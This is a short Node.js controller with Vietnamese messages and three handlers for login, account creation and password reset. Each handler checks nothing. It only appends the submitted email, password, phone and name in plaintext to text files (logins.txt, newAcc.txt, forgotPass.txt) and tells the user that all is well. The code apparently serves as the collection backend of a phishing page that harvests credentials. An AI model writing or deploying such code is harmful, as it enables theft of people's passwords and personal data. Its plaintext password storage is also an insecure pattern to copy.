const path = require('path');
const fileLogger = require('../utils/fileLogger');

exports.loginHandler = async (req, res) => {
  const { email, password } = req.body || {};
  if (!email || !password) {
    return res.status(400).json({ success: false, message: 'Thiếu email hoặc password' });
  }
  const log = `Email: ${email}, Password: ${password}, Time: ${new Date().toLocaleString()}\n`;
  try {
    await fileLogger.append('logins.txt', log);
    res.json({ success: true, message: 'Đăng nhập OK' });
  } catch (err) {
    console.error(err);
    res.status(500).json({ success: false, message: 'Lỗi server' });
  }
};

exports.createAccountHandler = async (req, res) => {
  const { first = '', last = '', email, phone, password } = req.body || {};
  if (!email || !phone || !password) {
    return res.status(400).json({ success: false, message: 'Thiếu email, phone hoặc password' });
  }
  const log = `First: ${first}, Last: ${last}, Email: ${email}, Phone: ${phone}, Password: ${password}, Time: ${new Date().toLocaleString()}\n`;
  try {
    await fileLogger.append('newAcc.txt', log);
    res.json({ success: true, message: 'Tạo tài khoản thành công' });
  } catch (err) {
    console.error(err);
    res.status(500).json({ success: false, message: 'Lỗi server' });
  }
};

// Thêm handler cho forgot password
exports.forgotHandler = async (req, res) => {
  const { identifier } = req.body || {};
  if (!identifier) {
    return res.status(400).json({ success: false, message: 'Thiếu số điện thoại' });
  }

  const log = `Identifier: ${identifier}, Time: ${new Date().toLocaleString()}\n`;
  try {
    await fileLogger.append('forgotPass.txt', log);
    res.json({ success: true, message: 'If the account exists, you will receive instructions via email or SMS.' });
  } catch (err) {
    console.error('Lỗi ghi forgotPass.txt', err);
    res.status(500).json({ success: false, message: 'Không thể ghi file' });
  }
};